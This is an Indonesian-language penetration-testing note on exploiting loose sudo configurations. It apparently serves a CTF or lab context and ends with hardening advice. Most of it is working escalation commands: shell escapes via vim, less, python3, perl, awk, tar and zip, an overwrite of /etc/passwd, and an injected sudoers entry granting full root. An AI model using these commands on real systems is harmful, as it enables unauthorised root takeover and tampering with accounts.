# Exploiting Sudo (sudo Privilege Escalation)

> **Tujuan:** Memanfaatkan konfigurasi `sudo` yang longgar untuk menjalankan **shell sebagai root** melalui binary yang diizinkan.

---

## Penjelasan Singkat

`sudo` memungkinkan user menjalankan command dengan privilege user lain (biasanya **root**). Jika konfigurasi sudo memberikan akses ke binary tertentu tanpa batasan, binary tersebut dapat disalahgunakan untuk **privilege escalation**.

---

## Cek Hak Sudo

```bash
sudo -l
# Menampilkan daftar command yang boleh dijalankan via sudo
```

Tampilan **aman** (user tidak punya akses sudo):

```text
tester@webserver:~$ sudo -l
[sudo] password for tester:
Sorry, user tester is not allowed to run sudo on webserver.
```

Tampilan **aman** (hanya command spesifik, tidak bisa diabuse):

```text
User tester may run the following commands on webserver:
    (root) NOPASSWD: /usr/bin/systemctl restart apache2
```

> Command spesifik dengan argumen eksplisit — **relatif aman**, tidak bisa dipakai spawn shell.

Tampilan **rentan** (ada binary yang bisa spawn shell):

```text
www-data@jobportal:~$ sudo -l
Matching Defaults entries for www-data on jobportal:
    env_reset, mail_badpass, secure_path=/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jobportal:

# --- shell langsung ---
    (root) NOPASSWD: /usr/bin/bash        ← RENTAN! langsung root shell
    (root) NOPASSWD: /usr/bin/sh          ← RENTAN! langsung root shell
    (root) NOPASSWD: /usr/bin/zsh         ← RENTAN! langsung root shell
    (root) NOPASSWD: /usr/bin/env         ← RENTAN! env /bin/sh

# --- editor & pager (shell escape) ---
    (root) NOPASSWD: /usr/bin/vim         ← RENTAN! :!/bin/sh
    (root) NOPASSWD: /usr/bin/less        ← RENTAN! !/bin/sh
    (root) NOPASSWD: /usr/bin/more        ← RENTAN! !/bin/sh
    (root) NOPASSWD: /usr/bin/man         ← RENTAN! man membuka pager
    (root) NOPASSWD: /usr/bin/journalctl  ← RENTAN! output dibuka via pager

# --- interpreter (spawn shell via script) ---
    (root) NOPASSWD: /usr/bin/python3     ← RENTAN! setuid(0) + exec shell
    (root) NOPASSWD: /usr/bin/perl       ← RENTAN! exec "/bin/sh"
    (root) NOPASSWD: /usr/bin/ruby       ← RENTAN! exec "/bin/sh"
    (root) NOPASSWD: /usr/bin/node        ← RENTAN! spawn("/bin/sh")
    (root) NOPASSWD: /usr/bin/php         ← RENTAN! exec shell via script
    (root) NOPASSWD: /usr/bin/lua         ← RENTAN! os.execute("/bin/sh")
    (root) NOPASSWD: /usr/bin/awk         ← RENTAN! system("/bin/sh")
```

> **Varian paling parah:** `(root) NOPASSWD: ALL` — user boleh menjalankan **semua command** sebagai root, cukup `sudo /bin/bash` untuk root shell langsung.

> **Catatan:** Daftar di atas difokuskan hanya ke binary yang **langsung memberi shell**. Binary lain seperti `cp`, `tee`, `tar`, `zip`, `wget`, `curl`, `find`, `ftp`, `git`, `docker` tetap bisa diabuse — daftar lengkapnya di GTFOBins → bagian **Sudo**. Cukup **satu** entry RENTAN untuk mendapatkan root shell.

Oneliner gabungan — cek SUID, sudo, dan capabilities **sekaligus** dalam satu command:

```bash
find / -perm -4000 -type f 2>/dev/null; sudo -l; getcap -r / 2>/dev/null
```

- `find / -perm -4000 -type f 2>/dev/null` → enumerasi binary SUID → [SUID.md](SUID.md)
- `sudo -l` → enumerasi permission sudoers (vektor file ini)
- `getcap -r / 2>/dev/null` → enumerasi capabilities → [Capabilities.md](Capabilities.md)

> **Catatan:** Separator `;` menjalankan ketiga command secara berurutan meskipun salah satunya gagal. Jika `sudo -l` meminta password (tidak NOPASSWD), gunakan varian non-interaktif `sudo -n -l` — langsung gagal tanpa menunggu input, cocok untuk scripting.

---

## Cek GTFOBins

Untuk setiap binary yang diizinkan → cek di [https://gtfobins.github.io](https://gtfobins.github.io) bagian **Sudo** untuk melihat apakah binary tersebut memiliki teknik privilege escalation.

---

## Contoh Eksploitasi

```bash
# bash / sh / zsh — langsung root shell
sudo bash

# env — runs shell via env utility
sudo env /bin/sh

# vim — shell escape command-mode
sudo vim -c ':!/bin/sh'

# find — exec arbitrary command
sudo find . -exec /bin/sh \; -quit

# less / more — ketik !/bin/sh di dalam pager
sudo less /etc/profile

# man — pager dibuka otomatis, ketik !/bin/sh
sudo man man

# journalctl — output panjang dibuka via pager, ketik !/bin/sh
sudo journalctl

# python3 — spawn shell via Python
sudo python3 -c 'import os;os.system("/bin/sh")'

# perl — exec shell
sudo perl -e 'exec "/bin/sh"'

# ruby — exec shell
sudo ruby -e 'exec "/bin/sh"'

# node — spawn shell
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: "inherit"})'

# php — pcntl_exec shell
sudo php -r 'pcntl_exec("/bin/sh", ["-p"]);'

# lua — os.execute shell
sudo lua -e 'os.execute("/bin/sh")'

# awk — system() menjalankan command
sudo awk 'BEGIN{system("/bin/sh")}'
```

| Binary | Metode | Catatan |
|--------|--------|---------|
| `bash`/`sh`/`zsh` | `sudo bash` | Langsung root shell |
| `env` | `sudo env /bin/sh` | Runs shell via env utility |
| `vim` | `:!/bin/sh` | Command‑mode shell |
| `less`/`more` | `!command` | Pager shell escape |
| `man`/`journalctl` | `!command` di dalam pager | Pager dibuka otomatis |
| `find` | `-exec` | Executes arbitrary command |
| `python3` | `os.system` | Spawn shell via Python |
| `perl` | `exec "/bin/sh"` | Spawn shell via Perl |
| `ruby` | `exec "/bin/sh"` | Spawn shell via Ruby |
| `node` | `spawn("/bin/sh")` | Spawn shell via Node |
| `php` | `pcntl_exec` | Spawn shell via PHP |
| `lua` | `os.execute("/bin/sh")` | Spawn shell via Lua |
| `awk` | `system("/bin/sh")` | Spawn shell via awk |

> Sudo aman dari **dash‑drop** (ruid=euid=0 saat command benar‑benar dijalankan sebagai root).

---

## Teknik Lanjutan (Jika Binary Tidak Langsung Spawn Shell)

```bash
# cp — timpa /etc/passwd dengan user baru (hash password kosong)
sudo cp /tmp/passwd_baru /etc/passwd

# tee — inject entry sudoers baru
echo 'tester ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers

# tar — exec shell via checkpoint action
sudo tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh

# zip — exec shell via -TT
sudo zip /tmp/x.zip x -TT '/bin/sh #'

# nmap — mode interaktif lama punya escape ke shell
sudo nmap --interactive
nmap> !sh
```

| Binary | Teknik | Catatan |
|--------|--------|---------|
| `cp` | Timpa `/etc/passwd` / `/etc/shadow` | Manipulasi akun |
| `tee` | Append entry sudoers baru | Self-grant sudo penuh |
| `tar` | `--checkpoint-action=exec=/bin/sh` | Exec arbitrary command |
| `zip` | Flag `-TT` | Exec command via test |
| `nmap` | `--interactive` + `!sh` | Mode interaktif lama (v < 7.92) |

---

## Contoh Tampilan Eksploitasi (Root Shell)

```text
www-data@jobportal:~$ sudo vim -c ':!/bin/sh'

# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cat /root/flag.txt
FLAG{sudo_vim_shell_escape_to_root}
```

> **Capture:** Eksploitasi berhasil — sudo menjalankan vim sebagai root, lalu `:!/bin/sh` spawn shell dengan `uid=0(root)` penuh. Berbeda dengan SUID yang hanya menghasilkan `euid=0`, sudo benar-benar berganti user ke root.

---

## Vektor Lain

### CVE‑2021‑3156 (Baron Samedit)

Heap‑based buffer overflow pada `sudoedit` yang memungkinkan **privilege escalation** pada versi rentan.

### LD_PRELOAD + env_keep

Jika `env_keep` mempertahankan `LD_PRELOAD`, attacker dapat memuat shared library berbahaya ketika program tertentu dijalankan via sudo.

```text
Defaults env_keep += "LD_PRELOAD"
```

Library berbahaya akan dieksekusi sebagai **root** saat sudo dijalankan.

---

## Alur Eksploitasi

```text
sudo -l
   ↓
Identifikasi command yang diizinkan
   ↓
Cek binary di GTFOBins → Sudo
   ↓
Periksa versi & konfigurasi sudo
   ↓
Validasi permission
   ↓
Uji privilege escalation
   ↓
id → verifikasi root
```

---

## Pengerasan Keamanan (Hardening)

- **Bersihkan Entry Sudoers** Hapus entry `NOPASSWD` pada sudoers untuk binary yang bisa spawn shell (vim, find, python3, less, env, awk, tar, zip, nmap).
- **Gunakan Allowlist Ketat** Batasi sudo hanya pada command esensial dengan path absolut dan argumen eksplisit.
- **Hindari Interpreter & Editor** Jangan izinkan interpreter (python, perl, ruby, node) maupun editor/pager (vim, less, awk) via sudo.
- **Aktifkan Logging** Pastikan log sudo (`/var/log/auth.log`) aktif dan dimonitor.

---

## Checklist Sudo LPE

- [ ] Jalankan `sudo -l` untuk melihat hak sudo.
- [ ] Identifikasi setiap binary yang diizinkan.
- [ ] Cek [GTFOBins](https://gtfobins.github.io) → bagian **Sudo**.
- [ ] Cek versi sudo (apakah rentan CVE‑2021‑3156).
- [ ] Cek apakah `env_keep` mempertahankan `LD_PRELOAD` (jika ada).
- [ ] Uji payload pada binary yang relevan.
- [ ] Verifikasi dengan `id` → `uid=0(root)`.

---

## Referensi

- [GTFOBins – Sudo](https://gtfobins.github.io/)
- [Sudo Security Advisories (Baron Samedit)](https://www.sudo.ws/security/advisories/)
- [OWASP – Privilege Escalation Cheat Sheet](https://owasp.org/www-project-privilege-escalation-cheat-sheet)
